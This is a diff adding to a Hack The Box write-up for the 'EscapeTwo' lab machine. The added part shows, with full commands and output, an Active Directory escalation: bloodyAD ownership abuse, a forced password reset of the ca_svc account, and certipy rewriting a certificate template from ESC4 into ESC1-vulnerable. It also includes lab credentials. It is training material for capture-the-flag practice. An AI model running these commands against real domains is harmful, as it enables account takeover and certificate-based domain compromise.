@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: smb mssql netexec zip xlsx workbook excel reverse powershell ps1 passwordsprayingattack xp_cmdshell mssqlclient.py sa rlwrap evil-winrm winrm 
+tags: smb mssql netexec zip xlsx workbook excel reverse powershell ps1 passwordsprayingattack xp_cmdshell mssqlclient.py sa rlwrap evil-winrm winrm bloodhound writeowner bloodyAD certipy templates esc4
 ---
 
 <br />
@@ -747,3 +747,269 @@ We detect that `ryan` has `WriteOwner` permissions over the `ca_svc` user:
 ![3](../../../assets/images/EscapeTwo/3.png)
 
 <br />
+
+What means this?
+
+This means that as `ryan`, we can change the password of `ca_svc` user.
+
+To do it, we only need to run two commands with `bloodyAD` from our local machine, one to add `ryan` as a owner of the `ca_svc` user, and a second one to set the `writeAll` permission and change the password of `ca_svc` with a powershell command from the victime machine.
+
+Let's do it:
+
+
+<br />
+
+```bash
+❯ bloodyAD --dc-ip 10.10.11.51 --host sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+[!] S-1-5-21-548670397-972687484-3496335370-1114 is already the owner, no modification will be made
+❯ bloodyAD --dc-ip 10.10.11.51 --host sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[+] ryan has now GenericAll on ca_svc
+```
+
+<br />
+
+Then, we can run the powershell command:
+
+<br />
+
+
+```bash
+*Evil-WinRM* PS C:\Users\ryan\Desktop> Set-ADAccountPassword -Identity ca_svc -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Reset
+```
+
+<br />
+
+With this `netexec` one-liner, we can verify that the changes were correctly applied:
+
+<br />
+
+```bash
+❯ netexec smb sequel.htb -u 'ca_svc' -p 'Password123!'
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:Password123!
+```
+
+<br />
+
+This user, is in the `Cert Publishers` group:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\ryan\Desktop> net user ca_svc
+User name                    ca_svc
+Full Name                    Certification Authority
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/14/2025 11:32:29 AM
+Password expires             Never
+Password changeable          6/15/2025 11:32:29 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   6/9/2024 10:14:42 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Cert Publishers
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+<br />
+
+So it will should be able to run `certipy`.
+
+If wen run it, there is a vulnerable template:
+
+<br />
+
+```bash
+❯ certipy find -vulnerable -u ca_svc -p 'Password123!' -dc-ip 10.10.11.51 -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
+```
+
+<br />
+
+The template is `DunderMifflinAuthentication` and its vulnerable to `ESC4`.
+
+This vulnerability is really critical, because it allows an attacker to modify template configurations and make the template vulnerable to other bugs, like `ESC1`.
+
+[This POST](https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/) explains very well this scenery.
+
+We can change the template configuration with this `certipy` one-liner:
+
+<br />
+
+```bash
+❯ certipy template -u ca_svc -p 'Password123!' -template DunderMifflinAuthentication -target 10.10.11.51 -save-old
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Successfully updated 'DunderMifflinAuthentication'
+```
+
+<br />
+
+Doing this, if we list again vulnerable templates, we should see the same template but being vunerable to `ESC1`:
+
+<br />
+
+```bash
+❯ certipy find -vulnerable -u ca_svc -p 'Password123!' -dc-ip 10.10.11.51 -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : ExportableKey
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 5 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Authenticated Users
+        Write Owner Principals          : SEQUEL.HTB\Authenticated Users
+        Write Dacl Principals           : SEQUEL.HTB\Authenticated Users
+        Write Property Principals       : SEQUEL.HTB\Authenticated Users
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
+      ESC2                              : 'SEQUEL.HTB\\Authenticated Users' can enroll and template can be used for any purpose
+      ESC3                              : 'SEQUEL.HTB\\Authenticated Users' can enroll and template has Certificate Request Agent EKU set
+      ESC4                              : 'SEQUEL.HTB\\Authenticated Users' has dangerous permissions
+```
+
+<br />
+
